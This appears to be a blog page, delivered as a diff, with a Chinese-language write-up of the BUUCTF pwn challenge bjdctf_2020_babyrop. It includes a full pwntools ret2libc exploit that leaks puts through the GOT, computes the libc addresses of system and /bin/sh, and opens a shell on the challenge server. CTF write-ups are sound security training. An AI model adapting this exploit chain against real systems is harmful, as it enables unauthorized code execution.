@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>BUUCTF Pwn Bjdctf_2020_babyrop | NiceSeven&#39;s Website</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/tags/">Tags</a></li>
+      
+      <li><a href="/">Links</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="article-meta">
+<h1><span class="title">BUUCTF Pwn Bjdctf_2020_babyrop</span></h1>
+<h2 class="author">NiceSeven</h2>
+<h2 class="date">2020/04/15</h2>
+</div>
+
+<main>
+<h1 id="buuctf-pwn-bjdctf_2020_babyrop">BUUCTF Pwn Bjdctf_2020_babyrop</h1>
+<p>考点</p>
+<p>1、64位栈溢出</p>
+<p>2、leak地址</p>
+<p>4、libc函数地址计算</p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200415174427943.png" alt="image-20200415174427943"></p>
+<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200415173634899.png" alt="image-20200415173634899"></p>
+<p>思路</p>
+<p>1、栈溢出使用puts_plt来leak出puts_got地址</p>
+<p>2、通过puts_got地址来计算基地址，从而计算出system、/bin/sh地址</p>
+<p>3、栈溢出getshell</p>
+<p>由于puts()函数只需要一个参数，所以只需要pop rdi；ret；这个gadget来传参</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
+<span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#39;</span>
+<span style="color:#75715e">#sh = process(&#39;./jarvisoj_level3_x64&#39;)</span>
+sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">node3.buuoj.cn</span><span style="color:#e6db74">&#39;</span>,<span style="color:#ae81ff">29484</span>)
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./bjdctf_2020_babyrop</span><span style="color:#e6db74">&#39;</span>)
+libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./ubuntu16-x64-libc-2.23.so</span><span style="color:#e6db74">&#39;</span>)
+
+rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400733</span>
+
+fakerbp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x8</span>
+offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">+</span> fakerbp
+puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]
+puts_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]
+vuln_fun <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">vuln</span><span style="color:#e6db74">&#39;</span>]
+
+payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>offset <span style="color:#f92672">+</span> p64(rdi_ret) <span style="color:#f92672">+</span> p64(puts_got) <span style="color:#f92672">+</span> p64(puts_plt) <span style="color:#f92672">+</span> p64(vuln_fun)
+payload1 <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(vuln_fun)
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">story!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,payload1)
+<span style="color:#75715e">#u64()函数的参数必须要8字节的字符串，这里puts出的puts_got地址只有6字节，所以需要用ljust方法补到8字节才能被u64()函数执行</span>
+puts_addr <span style="color:#f92672">=</span> u64(sh<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+<span style="color:#66d9ef">print</span> hex(puts_addr)
+base_addr <span style="color:#f92672">=</span> puts_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]
+system_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>] <span style="color:#f92672">+</span> base_addr
+binsh_addr <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span>)<span style="color:#f92672">.</span>next() <span style="color:#f92672">+</span> base_addr
+
+payload2 <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span>offset <span style="color:#f92672">+</span> p64(rdi_ret) <span style="color:#f92672">+</span> p64(binsh_addr) <span style="color:#f92672">+</span> p64(system_addr)
+sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">story!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,payload2)
+sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
+sh<span style="color:#f92672">.</span>interactive()
+</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200415174340059.png" alt="image-20200415174340059"></p>
+
+</main>
+
+  <footer>
+  
+  
+  <hr/>
+  © <a href="/">NiceSeven</a> 2017 &ndash; 2020 | <a href="https://github.com/NiceSeven">Github</a> |
+  
+  </footer>
+  </body>
+</html>
+
